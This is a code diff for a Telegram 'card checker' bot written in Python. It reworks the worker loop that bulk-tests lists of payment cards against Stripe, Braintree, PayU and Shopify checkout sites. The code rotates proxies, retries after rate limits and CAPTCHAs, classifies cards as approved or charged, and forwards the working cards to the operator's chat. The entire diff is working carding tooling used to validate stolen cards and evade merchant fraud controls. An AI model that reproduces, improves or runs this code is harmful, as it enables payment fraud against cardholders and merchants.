-                    os.rename(filepath, os.path.join(PROCESSED_DIR, os.path.basename(filepath)))
-                except Exception:
-                    pass
-
-        except Exception as e:
-            logger.exception(f"[parallel] Final summary error for user {user_id}: {e}")
-        finally:
-            # Clean up tracking dictionaries
-            self.user_job_count.pop(user_id, None)
-            self.user_completed_jobs.pop(user_id, None)
-            self.user_aggregated.pop(user_id, None)
-            self._user_progress_msg.pop(user_id, None)
-            self._user_job_ids.pop(user_id, None)
-
-    # ═══════════════ Worker Loop — parallel chunks + async proxy rotation ═══════════════
+    # ═══════════════ FIX: Worker Loop — async proxy rotation ═══════════════
     async def worker_loop(self, wid: int):
         logger.info(f"Worker {wid} started")
         while True:
@@ -4299,10 +3782,10 @@ class CardCheckerBot:
                 job = await self.task_queue.get()
                 got_job = True
                 job_id = job['id']
+                filepath = job['filepath']
                 chat_id = job['chat_id']
                 user_id = job['user_id']
                 gateway = job['gateway']
-                is_parallel = job.get('parallel', False)
 
                 if gateway in ['stripe', 'braintree'] and not self.is_user_approved(user_id):
                     await self.safe_send_message(chat_id, "🔒 No access. Job cancelled.")
@@ -4314,19 +3797,12 @@ class CardCheckerBot:
                     self.active_jobs.pop(job_id, None)
                     continue
 
-                # PARALLEL: Read cards from job dict (already split into chunks)
-                cards = job.get('cards', [])
-                if not cards:
-                    # Legacy fallback: read from filepath
-                    filepath = job.get('filepath')
-                    if filepath and os.path.exists(filepath):
-                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-                            cards = [line.strip() for line in f if '|' in line.strip()]
+                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                    cards = [line.strip() for line in f if '|' in line.strip()]
 
                 total = len(cards)
                 if total == 0:
-                    if not is_parallel:
-                        await self.safe_send_message(chat_id, "❌ No valid cards found.")
+                    await self.safe_send_message(chat_id, "❌ No valid cards found.")
                     self.active_jobs.pop(job_id, None)
                     continue
 
@@ -4335,195 +3811,29 @@ class CardCheckerBot:
                 declined_count = 0
                 start_time = datetime.now()
 
-                if not is_parallel:
-                    # Non-parallel: send its own progress message
-                    msg = await self.safe_send_message(
-                        chat_id,
-                        f"⏳ <code>Starting {gateway.upper()} mass check... ({total:,} cards)</code>",
-                    )
-                    job['message_id'] = msg.id
-
+                msg = await self.safe_send_message(
+                    chat_id,
+                    f"⏳ <code>Starting {gateway.upper()} mass check... ({total:,} cards)</code>",
+                )
+                job['message_id'] = msg.id
                 no_progress_deadline = time.time() + JOB_NO_PROGRESS_TIMEOUT
-
-                # ═══════════════ CONCURRENT: Stripe/Braintree via PayU ═══════════════
-                if gateway in ['stripe', 'braintree']:
-                    payu_sem = asyncio.Semaphore(PAYU_CONCURRENCY)
-                    _results_lock = asyncio.Lock()
-                    _processed = [0]
-                    _declined = [0]
-                    otp_cards = []
-
-                    async def _check_one_payu(card_line):
-                        """Process a single Stripe/Braintree card concurrently via PayU with retry logic."""
-                        if job.get('stop'):
-                            return
-                        chash = f"{user_id}_{card_line}"
-                        if chash in self._processing_cards:
-                            return
-                        self._processing_cards.add(chash)
-                        try:
-                            async with payu_sem:
-                                if job.get('stop'):
-                                    return
-                                if not self.is_user_approved(user_id):
-                                    job['stop'] = True
-                                    return
-
-                                # Retry logic for retryable errors (429, 503, timeout)
-                                raw = ""
-                                classification = "DECLINED"
-                                retryable_markers = ["429", "503", "TIMEOUT", "RATE_LIMIT", "THROTTL", "CONNECTION"]
-                                for attempt in range(MAX_CARD_RETRIES + 1):
-                                    card_start = time.time()
-                                    try:
-                                        raw = await self.send_card_to_payu(card_line, gateway=gateway)
-                                    except asyncio.TimeoutError:
-                                        raw = "TIMEOUT"
-                                    except Exception as e:
-                                        raw = f"ERROR: {str(e)[:60]}"
-                                    elapsed_ms = int((time.time() - card_start) * 1000)
-                                    classification = self.classify_payu_response(raw)
-
-                                    # Check if retryable
-                                    raw_upper = raw.upper() if raw else ""
-                                    is_retryable = any(m in raw_upper for m in retryable_markers)
-                                    if is_retryable and attempt < MAX_CARD_RETRIES:
-                                        logger.info(
-                                            f"[worker-{wid}] {gateway.upper()} | BIN={card_line[:6]} | "
-                                            f"RETRY {attempt+1}/{MAX_CARD_RETRIES} ({raw[:40]}) | {elapsed_ms}ms"
-                                        )
-                                        await asyncio.sleep(random.uniform(1.0, 3.0))
-                                        continue
-                                    break
-
-                                logger.info(
-                                    f"[worker-{wid}] {gateway.upper()} | BIN={card_line[:6]} | "
-                                    f"{classification} | {elapsed_ms}ms"
-                                )
-
-                                async with _results_lock:
-                                    _processed[0] += 1
-                                    self.stats["total_checked"] += 1
-                                    self.update_user_stats(user_id, checked=1)
-
-                                    if classification in ("CHARGED", "APPROVED", "OTP_REQUIRED"):
-                                        if classification == "CHARGED":
-                                            if gateway == 'stripe':
-                                                fmt = await self.format_stripe_approved(card_line, raw, include_charge=True)
-                                            else:
-                                                fmt = await self.format_braintree_charged(card_line, raw)
-                                            charged_cards.append(card_line)
-                                            self.stats["total_charged"] += 1
-                                            self.update_user_stats(user_id, charged=1)
-                                        elif classification == "OTP_REQUIRED":
-                                            if gateway == 'stripe':
-                                                fmt = await self.format_stripe_approved(card_line, raw, include_charge=True)
-                                            else:
-                                                fmt = await self.format_braintree_auth(card_line, raw)
-                                            otp_cards.append(card_line)
-                                        else:
-                                            if gateway == 'stripe':
-                                                fmt = await self.format_stripe_approved(card_line, raw, include_charge=True)
-                                            else:
-                                                fmt = await self.format_braintree_auth(card_line, raw)
-
-                                        await self.safe_send_message(chat_id, fmt)
-                                        self.stats["total_approved"] += 1
-                                        approved_cards.append(card_line)
-                                        self.update_user_stats(user_id, approved=1)
-
-                                        if is_parallel:
-                                            async with self._aggregated_lock:
-                                                agg = self.user_aggregated.get(user_id)
-                                                if agg:
-                                                    agg['approved'] += 1
-                                                    agg['approved_cards'].append(card_line)
-                                                    if classification == "CHARGED":
-                                                        agg['charged'] += 1
-                                                        agg['charged_cards'].append(card_line)
-                                    else:
-                                        _declined[0] += 1
-                                        if is_parallel:
-                                            async with self._aggregated_lock:
-                                                agg = self.user_aggregated.get(user_id)
-                                                if agg:
-                                                    agg['declined'] += 1
-
-                                    # Progress updates
-                                    if is_parallel:
-                                        async with self._aggregated_lock:
-                                            agg = self.user_aggregated.get(user_id)
-                                            if agg:
-                                                agg['processed'] += 1
-                                                agg_processed = agg['processed']
-                                                agg_total = agg['total_cards']
-                                            else:
-                                                agg_processed = _processed[0]
-                                                agg_total = total
-                                        now = time.time()
-                                        last_update = self._last_progress_update.get(user_id, 0)
-                                        should_update = (
-                                            (agg_processed % 50 == 0 or agg_processed == agg_total)
-                                            and (now - last_update >= 10.0)
-                                        )
-                                        if should_update:
-                                            msg_id = self._user_progress_msg.get(user_id)
-                                            if msg_id:
-                                                self._last_progress_update[user_id] = now
-                                                try:
-                                                    await self.update_aggregated_progress(chat_id, msg_id, user_id)
-                                                except Exception:
-                                                    pass
-                                    else:
-                                        proc = _processed[0]
-                                        if proc % 5 == 0 or proc == total:
-                                            elapsed = datetime.now() - start_time
-                                            elapsed_secs = elapsed.total_seconds()
-                                            if proc > 0 and elapsed_secs > 0:
-                                                avg_per_card = elapsed_secs / proc
-                                                remaining_secs = (total - proc) * avg_per_card
-                                            else:
-                                                remaining_secs = 0
-                                            elapsed_str = str(elapsed).split('.')[0]
-                                            remaining_str = str(timedelta(seconds=int(remaining_secs))).split('.')[0]
-                                            try:
-                                                await self.pulse_progress(
-                                                    chat_id, job['message_id'], proc, total,
-                                                    card_line, job_id, elapsed_str, remaining_str
-                                                )
-                                            except Exception:
-                                                pass
-                        except Exception as e:
-                            logger.warning(f"PayU card error ({card_line[:6]}...): {e}")
-                        finally:
-                            self._processing_cards.discard(chash)
-
-                    # Launch all cards concurrently (semaphore limits parallelism)
-                    tasks = [_check_one_payu(c) for c in cards]
-                    await asyncio.gather(*tasks, return_exceptions=True)
-                    declined_count = _declined[0]
-                    # Skip the sequential for loop below — results already collected
-                    cards = []
 
                 for idx, card in enumerate(cards, 1):
                     if time.time() > no_progress_deadline:
-                        if not is_parallel:
-                            await self.safe_send_message(
-                                chat_id,
-                                f"⏹ No progress for {JOB_NO_PROGRESS_TIMEOUT // 60} minutes. Auto-cancelled."
-                            )
+                        await self.safe_send_message(
+                            chat_id,
+                            f"⏹ No progress for {JOB_NO_PROGRESS_TIMEOUT // 60} minutes. Auto-cancelled."
+                        )
                         job['stop'] = True
                         break
 
                     if gateway in ['stripe', 'braintree'] and not self.is_user_approved(user_id):
-                        if not is_parallel:
-                            await self.safe_send_message(chat_id, "⏹ Access expired.")
+                        await self.safe_send_message(chat_id, "⏹ Access expired.")
                         job['stop'] = True
                         break
 
                     if gateway == 'shopify' and not self.is_shopify_approved(user_id):
-                        if not is_parallel:
-                            await self.safe_send_message(chat_id, "⏹ Shopify access expired.")
+                        await self.safe_send_message(chat_id, "⏹ Shopify access expired.")
                         job['stop'] = True
                         break
 
@@ -4537,9 +3847,7 @@ class CardCheckerBot:
 
                     try:
                         if gateway in ['stripe', 'braintree']:
-                            logger.info(f"[worker-{wid}] Processing {gateway.upper()} card {card[:6]}...")
                             raw = await self.send_card_to_payu(card, gateway=gateway)
-                            logger.info(f"[worker-{wid}] {gateway.upper()} response received for {card[:6]}...")
                             if self.is_approved(raw):
                                 is_charged = self.is_charged_response(raw)
                                 if gateway == 'stripe':
@@ -4566,44 +3874,38 @@ class CardCheckerBot:
                             if idx % 10 == 1:
                                 await self._unblock_captcha_sites()
                             # Check if all sites are dead every 10 cards — stop job instead of burning cards
-                            if idx % 10 == 1 and not self.working_sites:
-                                if not is_parallel:
-                                    await self.safe_send_message(
-                                        chat_id,
-                                        "⛔ <b>ALL SITES ARE DEAD</b> — stopping mass job.\n"
-                                        f"Dead: {len(self.dead_sites)} sites. Run /test_sites to refresh.",
-                                        parse_mode='html'
-                                    )
+                            if idx % 10 == 1 and not self.working_sites and all(s in self.dead_sites for s in self.owner_sites):
+                                await self.safe_send_message(
+                                    chat_id,
+                                    "⛔ <b>ALL SITES ARE DEAD</b> — stopping mass job.\n"
+                                    f"Dead: {len(self.dead_sites)} sites. Run /test_sites to refresh.",
+                                    parse_mode='html'
+                                )
                                 job['stop'] = True
-                                # Stop all parallel jobs for this user too
-                                if is_parallel:
-                                    for jid in self._user_job_ids.get(user_id, []):
-                                        j = self.active_jobs.get(jid)
-                                        if j:
-                                            j['stop'] = True
                                 break
 
                             proxy = await self.get_next_proxy_async(user_id)
+                            # FIX: Pass user's selected amount filter instead of hardcoded "all"
                             user_filter = self.user_amount_filter.get(user_id, "all")
+                            # Per-card timer for diagnostics
                             card_start = time.time()
-                            # Timeout wrapper: API timeout + 5s safety margin
+                            # OPTIMISED: removed asyncio.wait_for wrapper — API already has its own timeout
                             try:
-                                raw, ok, info = await asyncio.wait_for(
-                                    self.shopify_check_card(
-                                        card, proxy_str=proxy, user_id=user_id, amount_filter=user_filter
-                                    ),
-                                    timeout=SHOPIFY_API_TIMEOUT + 5
+                                raw, ok, info = await self.shopify_check_card(
+                                    card, proxy_str=proxy, user_id=user_id, amount_filter=user_filter
                                 )
                             except asyncio.TimeoutError:
                                 raw, ok, info = "ERROR", False, {"reason": "Card timed out (mass job guard)", "site": "n/a"}
                             card_elapsed = time.time() - card_start
+                            # Log per-card timing — helps diagnose fast-fail (< 1s = not reaching payment)
                             logger.info(
-                                f"[worker-{wid}] Card {card[:6]}... | {card_elapsed:.2f}s | "
+                                f"[worker] Card {card[:6]}... | {card_elapsed:.2f}s | "
                                 f"site={info.get('site', 'n/a')} | result={raw} | reason={info.get('reason', '')[:50]}"
                             )
+                            # Warn if cards are completing suspiciously fast (not reaching payment step)
                             if card_elapsed < FAST_FAIL_THRESHOLD_SECS and raw != "No sites":
                                 logger.warning(
-                                    f"[worker-{wid}] ⚠️ FAST-FAIL: Card completed in {card_elapsed:.2f}s — "
+                                    f"[worker] ⚠️ FAST-FAIL: Card completed in {card_elapsed:.2f}s — "
                                     f"checkout likely not reaching payment step. site={info.get('site', 'n/a')}"
                                 )
                             if ok:
@@ -4617,57 +3919,33 @@ class CardCheckerBot:
                                     charged_cards.append(card)
                                     self.stats["total_charged"] += 1
                                     self.update_user_stats(user_id, charged=1)
-
-                                # PARALLEL: update aggregated stats
-                                if is_parallel:
-                                    async with self._aggregated_lock:
-                                        agg = self.user_aggregated.get(user_id)
-                                        if agg:
-                                            agg['approved'] += 1
-                                            agg['approved_cards'].append(card)
-                                            if raw == "CHARGED":
-                                                agg['charged'] += 1
-                                                agg['charged_cards'].append(card)
                             else:
                                 reason = info.get("reason", "Unknown")
-                                # FIXED: use dict methods instead of getattr (job is a dict, not an object)
+                                # Retryable failures → queue for retry (up to MAX_CARD_RETRIES)
+                                # FIXED: use dict methods instead of getattr/hasattr (job is a dict, not an object)
                                 retry_counts = job.setdefault('_retry_counts', {})
                                 retry_count = retry_counts.get(card, 0)
-                                retryable_markers = ["429", "503", "MERCHANDISE_EXPECTED_PRICE_MISMATCH", "CAPTCHA_RETRY_NEW_PROXY", "API_TIMEOUT", "All sites failed", "No sites", "ERROR", "THROTTL", "Change Proxy"]
-                                is_retryable = raw in retryable_markers or any(m in str(info.get("reason", "")) for m in retryable_markers)
+                                is_retryable = raw in ("All sites failed", "No sites", "ERROR")
                                 if is_retryable and retry_count < MAX_CARD_RETRIES:
-                                    # SILENT re-queue: no Telegram message for retryable attempts
                                     retry_counts[card] = retry_count + 1
+                                    # Re-queue card for retry at end of cards list
                                     cards.append(card)
-                                    total += 1
+                                    total += 1  # Adjust total to account for retry
                                     self.throttle.record_error()
                                     logger.info(
-                                        f"[worker-{wid}] ♻️ Re-queued card {card[:6]}... for retry "
+                                        f"[worker] ♻️ Re-queued card {card[:6]}... for retry "
                                         f"{retry_count + 1}/{MAX_CARD_RETRIES} | reason={reason}"
                                     )
                                 else:
-                                    # Final result: card exhausted all retries or got a permanent decline
                                     if is_retryable:
-                                        # All retries exhausted with retryable errors → mark as ERROR, not DECLINED
                                         self.throttle.record_error()
-                                        logger.warning(
-                                            f"[worker-{wid}] ❌ Card {card[:6]}... ERROR after {retry_count}/{MAX_CARD_RETRIES} retries "
-                                            f"| site={info.get('site', 'n/a')} | reason={reason}"
-                                        )
                                     else:
-                                        # Permanent decline (CARD_DECLINED, EXPIRED_CARD, etc.)
                                         self.throttle.record_success()
-                                        logger.warning(
-                                            f"Shopify DECLINED {card[:6]}... | site={info.get('site', 'n/a')} "
-                                            f"| proxy={(proxy or 'none')[:40]} | reason={reason} | {card_elapsed:.2f}s"
-                                        )
+                                    logger.warning(
+                                        f"Shopify failed for {card[:6]}... | site={info.get('site', 'n/a')} "
+                                        f"| proxy={(proxy or 'none')[:40]} | reason={reason} | {card_elapsed:.2f}s"
+                                    )
                                     declined_count += 1
-                                    # PARALLEL: update aggregated declined count
-                                    if is_parallel:
-                                        async with self._aggregated_lock:
-                                            agg = self.user_aggregated.get(user_id)
-                                            if agg:
-                                                agg['declined'] += 1
 
                     except Exception as card_err:
                         logger.warning(f"Card error ({card[:6]}...): {card_err}")
@@ -4682,182 +3960,133 @@ class CardCheckerBot:
                     self.update_user_stats(user_id, checked=1)
                     no_progress_deadline = time.time() + JOB_NO_PROGRESS_TIMEOUT
 
-                    # Job state persistence every 30 seconds
-                    if time.time() - self._last_job_save > 30:
-                        self._last_job_save = time.time()
-                        self._save_job_state()
-                    if is_parallel:
-                        agg_processed = 0
-                        agg_total = 0
-                        async with self._aggregated_lock:
-                            agg = self.user_aggregated.get(user_id)
-                            if agg:
-                                agg['processed'] += 1
-                                agg_processed = agg['processed']
-                                agg_total = agg['total_cards']
-                        # SCALABLE: Update every 50 aggregated cards or 10s (whichever longer)
-                        now = time.time()
-                        last_update = self._last_progress_update.get(user_id, 0)
-                        should_update = (
-                            (agg_processed % 50 == 0 or agg_processed == agg_total)
-                            and (now - last_update >= 10.0)
-                        )
-                        if should_update:
-                            msg_id = self._user_progress_msg.get(user_id)
-                            if msg_id:
-                                self._last_progress_update[user_id] = now
-                                await self.update_aggregated_progress(chat_id, msg_id, user_id)
-                    else:
-                        # Non-parallel: update progress — every card for Stripe/Braintree, every 5 for Shopify
-                        stripe_bt_every_card = gateway in ('stripe', 'braintree')
-                        if stripe_bt_every_card or processed % 5 == 0 or processed == total:
-                            elapsed = datetime.now() - start_time
-                            elapsed_secs = elapsed.total_seconds()
-                            if processed > 0 and elapsed_secs > 0:
-                                avg_per_card = elapsed_secs / processed
-                                remaining_secs = (total - processed) * avg_per_card
-                            else:
-                                remaining_secs = 0
-                            elapsed_str = str(elapsed).split('.')[0]
-                            remaining_str = str(timedelta(seconds=int(remaining_secs))).split('.')[0]
-                            try:
-                                await self.pulse_progress(
-                                    chat_id, job['message_id'], processed, total,
-                                    card, job_id, elapsed_str, remaining_str
-                                )
-                            except Exception:
-                                pass
-
+                    # Update progress UI every 5 cards to reduce Telegram API load
+                    if processed % 5 == 0 or processed == total:
+                        elapsed = datetime.now() - start_time
+                        # FIX: Real ETA based on actual elapsed time per card
+                        elapsed_secs = elapsed.total_seconds()
+                        if processed > 0 and elapsed_secs > 0:
+                            avg_per_card = elapsed_secs / processed
+                            remaining_secs = (total - processed) * avg_per_card
+                        else:
+                            remaining_secs = 0
+                        elapsed_str = str(elapsed).split('.')[0]
+                        remaining_str = str(timedelta(seconds=int(remaining_secs))).split('.')[0]
+                        try:
+                            await self.pulse_progress(
+                                chat_id, job['message_id'], processed, total,
+                                card, job_id, elapsed_str, remaining_str
+                            )
+                        except:
+                            pass
                     # Only throttle for non-Shopify gateways (Shopify is already timeout-guarded)
                     if gateway != 'shopify':
                         await self.throttle.wait()
-                    else:
-                        # Randomised delay between Shopify cards — balances throughput vs 429 avoidance
-                        await asyncio.sleep(random.uniform(0.5, 1.0))
 
                 # ━━━━━━ COMPLETION ━━━━━━
-                if is_parallel:
-                    # PARALLEL: increment completed jobs, check if all done
-                    all_done = False
-                    async with self._aggregated_lock:
-                        self.user_completed_jobs[user_id] = self.user_completed_jobs.get(user_id, 0) + 1
-                        if self.user_completed_jobs[user_id] >= self.user_job_count.get(user_id, 1):
-                            all_done = True
-                    if all_done:
-                        # All chunks finished — send final summary once
-                        msg_id = self._user_progress_msg.get(user_id)
-                        await self._send_parallel_final_summary(chat_id, user_id, msg_id or 0, gateway)
-                        logger.info(f"[parallel] All chunks complete for user {user_id}")
-                else:
-                    # Non-parallel: send summary directly (original logic)
-                    try:
-                        user_entity = await self.bot_client.get_entity(user_id)
-                        username = user_entity.username or "No username"
-                        user_link = f"@{username}" if user_entity.username else f"ID: <code>{user_id}</code>"
-                    except Exception:
-                        user_link = f"ID: <code>{user_id}</code>"
+                try:
+                    user_entity = await self.bot_client.get_entity(user_id)
+                    username = user_entity.username or "No username"
+                    user_link = f"@{username}" if user_entity.username else f"ID: <code>{user_id}</code>"
+                except:
+                    user_link = f"ID: <code>{user_id}</code>"
 
-                    if approved_cards:
-                        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
-                        if gateway == 'stripe':
-                            user_file = os.path.join(PROCESSED_DIR, f"approved_{user_id}_{ts}.txt")
-                            cap = "✅ Stripe Approved"
-                        elif gateway == 'braintree':
-                            user_file = os.path.join(PROCESSED_DIR, f"bt_approved_{user_id}_{ts}.txt")
-                            cap = "🌐 Braintree Approved"
-                        else:
-                            user_file = os.path.join(PROCESSED_DIR, f"shopify_approved_{user_id}_{ts}.txt")
-                            cap = "✅ Shopify Approved"
+                if approved_cards:
+                    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
+                    if gateway == 'stripe':
+                        user_file = os.path.join(PROCESSED_DIR, f"approved_{user_id}_{ts}.txt")
+                        cap = "✅ Stripe Approved"
+                    elif gateway == 'braintree':
+                        user_file = os.path.join(PROCESSED_DIR, f"bt_approved_{user_id}_{ts}.txt")
+                        cap = "�� Braintree Approved"
+                    else:
+                        user_file = os.path.join(PROCESSED_DIR, f"shopify_approved_{user_id}_{ts}.txt")
+                        cap = "✅ Shopify Approved"
 
-                        with open(user_file, "w") as f:
-                            f.write("\n".join(approved_cards))
+                    with open(user_file, "w") as f:
+                        f.write("\n".join(approved_cards))
 
-                        rate = len(approved_cards) / total * 100
-                        rate_w = 10
-                        rf = int(rate_w * (rate / 100)) if rate <= 100 else rate_w
-                        rate_bar = '█' * rf + '░' * (rate_w - rf)
+                    rate = len(approved_cards) / total * 100
+                    rate_w = 10
+                    rf = int(rate_w * (rate / 100)) if rate <= 100 else rate_w
+                    rate_bar = '█' * rf + '░' * (rate_w - rf)
 
-                        summary = (
-                            "╔══════════════════════════════╗\n"
-                            "║   ✅ JOB COMPLETED            ║\n"
-                            "╚══════════════════════════════╝\n\n"
-                            "┏━━━━━ 📊 Results ━━━━━━━━━━┓\n"
-                            f"┃ 📃 Total:    <code>{total:,}</code>\n"
-                            f"┃ ✅ Hits:     <code>{len(approved_cards):,}</code>\n"
-                        )
-                        if charged_cards:
-                            summary += f"┃ 💰 Charged:  <code>{len(charged_cards):,}</code>\n"
-                        if gateway == 'shopify':
-                            summary += f"┃ ❌ Declined: <code>{declined_count:,}</code>\n"
-                        summary += (
-                            f"┃ 📈 Rate:     <code>[{rate_bar}] {rate:.1f}%</code>\n"
-                            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
-                        )
+                    summary = (
+                        "╔══════════════════════════════╗\n"
+                        "║   ✅ JOB COMPLETED            ║\n"
+                        "╚══════════════════════════════╝\n\n"
+                        "┏━━━━━ 📊 Results ━━━━━━━━━━┓\n"
+                        f"┃ 📃 Total:    <code>{total:,}</code>\n"
+                        f"┃ ✅ Hits:     <code>{len(approved_cards):,}</code>\n"
+                    )
+                    if charged_cards:
+                        summary += f"┃ 💰 Charged:  <code>{len(charged_cards):,}</code>\n"
+                    if gateway == 'shopify':
+                        summary += f"┃ ❌ Declined: <code>{declined_count:,}</code>\n"
+                    summary += (
+                        f"┃ 📈 Rate:     <code>[{rate_bar}] {rate:.1f}%</code>\n"
+                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
+                    )
 
-                        await self.safe_send_message(chat_id, summary)
-                        await self.bot_client.send_file(chat_id, user_file, caption=cap)
-                        os.remove(user_file)
+                    await self.safe_send_message(chat_id, summary)
+                    await self.bot_client.send_file(chat_id, user_file, caption=cap)
+                    os.remove(user_file)
 
-                        owner_file = os.path.join(PROCESSED_DIR, f"owner_{gateway}_{user_id}_{ts}.txt")
-                        with open(owner_file, "w") as f:
-                            f.write(f"=== {gateway.upper()} APPROVED ===\n")
-                            f.write(f"User: {user_link}\n")
-                            f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                            f.write(f"Hits: {len(approved_cards)}\n{'='*40}\n")
-                            for c in approved_cards:
+                    owner_file = os.path.join(PROCESSED_DIR, f"owner_{gateway}_{user_id}_{ts}.txt")
+                    with open(owner_file, "w") as f:
+                        f.write(f"=== {gateway.upper()} APPROVED ===\n")
+                        f.write(f"User: {user_link}\n")
+                        f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                        f.write(f"Hits: {len(approved_cards)}\n{'='*40}\n")
+                        for c in approved_cards:
+                            f.write(f"{c}\n")
+
+                    await self.bot_client.send_file(
+                        FORWARD_CHAT_ID, owner_file,
+                        caption=f"📊 {gateway.upper()} | {user_link} | ✅ {len(approved_cards)} hits",
+                        parse_mode='html'
+                    )
+                    os.remove(owner_file)
+
+                    if charged_cards:
+                        cf = os.path.join(PROCESSED_DIR, f"CHARGED_{gateway}_{user_id}_{ts}.txt")
+                        with open(cf, "w") as f:
+                            f.write(f"=== {gateway.upper()} CHARGED ===\n")
+                            f.write(f"User: {user_link}\nCount: {len(charged_cards)}\n{'='*40}\n")
+                            for c in charged_cards:
                                 f.write(f"{c}\n")
-
                         await self.bot_client.send_file(
-                            FORWARD_CHAT_ID, owner_file,
-                            caption=f"📊 {gateway.upper()} | {user_link} | ✅ {len(approved_cards)} hits",
+                            FORWARD_CHAT_ID, cf,
+                            caption=f"💰 {gateway.upper()} CHARGED | {user_link} | {len(charged_cards)} cards",
                             parse_mode='html'
                         )
-                        os.remove(owner_file)
+                        os.remove(cf)
+                else:
+                    summary = (
+                        "╔══════════════════════════════╗\n"
+                        "║   ✅ JOB COMPLETED            ║\n"
+                        "╚══════════════════════════════╝\n\n"
+                        f"┃ 📃 Total: <code>{total:,}</code>\n"
+                        f"┃ ❌ Hits:  <code>0</code>\n"
+                    )
+                    if gateway == 'shopify':
+                        summary += f"┃ 🚫 Declined: <code>{declined_count:,}</code>\n"
+                    summary += "┃ 📈 Rate: <code>0%</code>"
+                    await self.safe_send_message(chat_id, summary)
+                    await self.safe_send_message(FORWARD_CHAT_ID,
+                        f"📊 {gateway.upper()} done | {user_link} | ❌ No hits")
 
-                        if charged_cards:
-                            cf = os.path.join(PROCESSED_DIR, f"CHARGED_{gateway}_{user_id}_{ts}.txt")
-                            with open(cf, "w") as f:
-                                f.write(f"=== {gateway.upper()} CHARGED ===\n")
-                                f.write(f"User: {user_link}\nCount: {len(charged_cards)}\n{'='*40}\n")
-                                for c in charged_cards:
-                                    f.write(f"{c}\n")
-                            await self.bot_client.send_file(
-                                FORWARD_CHAT_ID, cf,
-                                caption=f"💰 {gateway.upper()} CHARGED | {user_link} | {len(charged_cards)} cards",
-                                parse_mode='html'
-                            )
-                            os.remove(cf)
-                    else:
-                        summary = (
-                            "╔══════════════════════════════╗\n"
-                            "║   ✅ JOB COMPLETED            ║\n"
-                            "╚══════════════════════════════╝\n\n"
-                            f"┃ 📃 Total: <code>{total:,}</code>\n"
-                            f"┃ ❌ Hits:  <code>0</code>\n"
-                        )
-                        if gateway == 'shopify':
-                            summary += f"┃ 🚫 Declined: <code>{declined_count:,}</code>\n"
-                        summary += "┃ 📈 Rate: <code>0%</code>"
-                        await self.safe_send_message(chat_id, summary)
-                        await self.safe_send_message(FORWARD_CHAT_ID,
-                            f"📊 {gateway.upper()} done | {user_link} | ❌ No hits")
+                try:
+                    os.rename(filepath, os.path.join(PROCESSED_DIR, os.path.basename(filepath)))
+                except:
+                    pass
 
-                    try:
-                        filepath = job.get('filepath')
-                        if filepath:
-                            os.rename(filepath, os.path.join(PROCESSED_DIR, os.path.basename(filepath)))
-                    except Exception:
-                        pass
-
-            except asyncio.CancelledError:
-                logger.info(f"Worker {wid} cancelled — cleaning up")
-                break
             except Exception as e:
                 logger.exception(f"Worker {wid} error: {e}")
                 if chat_id:
                     try:
                         await self.safe_send_message(chat_id, f"❌ Error: <code>{str(e)[:100]}</code>")
-                    except Exception:
+                    except:
                         pass
             finally:
                 if job_id:
@@ -4875,42 +4104,21 @@ class CardCheckerBot:
                 self.bot_client = TelegramClient("bot_session", API_ID, API_HASH)
                 await self.bot_client.start(bot_token=BOT_TOKEN)
                 self.user_client = TelegramClient("checker_session", API_ID, API_HASH)
-                
                 if os.path.exists("checker_session.session"):
-                    await self.user_client.connect()
-                    # تم إصلاح المحاذاة هنا لتصبح داخل شرط الـ if الصحيح
-                    if not await self.user_client.is_user_authorized():
-                        raise Exception("Session not authorized. Upload valid bot_session.session")
+                    await self.user_client.start()
                 else:
                     await self.user_client.start(phone=PHONE_NUMBER)
 
                 # No periodic site health check — sites are trusted as-is
                 for i in range(NUM_WORKERS):
                     self.worker_tasks.append(asyncio.create_task(self.worker_loop(i)))
-
-                # Resume persisted jobs from previous crash
-                for jid, job_entry in list(self.active_jobs.items()):
-                    if job_entry.get('cards'):
-                        try:
-                            await self.task_queue.put(job_entry)
-                            logger.info(f"[resume] Queued persisted job {jid} ({len(job_entry['cards'])} cards)")
-                        except Exception as e:
-                            logger.warning(f"[resume] Failed to queue job {jid}: {e}")
-
-                # Periodic job state save every 30s
-                job_save_task = asyncio.create_task(self._periodic_job_save())
-
                 bot_task = asyncio.create_task(self.start_bot())
-                await asyncio.gather(bot_task, job_save_task, *self.worker_tasks)
+                await asyncio.gather(bot_task, *self.worker_tasks)
             except (ConnectionError, errors.RPCError, OSError) as e:
                 logger.error(f"Connection lost: {e}. Reconnecting in 10s...")
                 await asyncio.sleep(10)
                 for t in self.worker_tasks:
                     t.cancel()
-                try:
-                    job_save_task.cancel()
-                except Exception:
-                    pass
                 if self.bot_client:
                     await self.bot_client.disconnect()
                 if self.user_client:
@@ -4940,31 +4148,28 @@ class CardCheckerBot:
         self.load_user_stats()
         self.load_redeem_codes()
         self.load_owner_sites()
-        # Load persisted incomplete jobs for resume after restart
-        self._load_job_state()
         if self.owner_sites:
-            # Prefer tested working sites from working_sites.txt
+            # FIX: Prefer tested working sites if available, else trust all uploaded sites
             loaded = self.load_working_sites_from_file()
             if loaded > 0:
+                self.dead_sites = set()
                 self._sites_ready = True
                 logger.info(f"✅ Loaded {loaded} TESTED working sites from working_sites file")
             else:
-                # NO FALLBACK: do not trust untested owner sites
-                self.working_sites = []
-                self._sites_ready = False
-                logger.warning(f"⚠️ No working sites found. Run /test_sites first. ({len(self.owner_sites)} owner sites loaded but NOT used)")
-            # FIX: Use ONLY self.working_sites for prefetch — no good_sites fallback
-            uncached = [s for s in self.working_sites if s not in self._site_price_cache]
+                self.working_sites = list(self.owner_sites)
+                self.dead_sites = set()
+                self._sites_ready = True
+                logger.info(f"✅ Loaded {len(self.working_sites)} sites (all trusted — run /test_sites to validate)")
+            # OPTIMISED: only prefetch site prices if cache doesn't already cover all sites
+            sites = list(self.good_sites) if self.good_sites else list(self.working_sites)
+            uncached = [s for s in sites if s not in self._site_price_cache]
             if uncached:
                 try:
                     await self.prefetch_site_prices()
                 except Exception as e:
                     logger.warning(f"⚠️ Price prefetch failed (non-critical): {e}")
             else:
-                if self.working_sites:
-                    logger.info(f"[startup] Price cache already full ({len(self.working_sites)} sites), skipping prefetch")
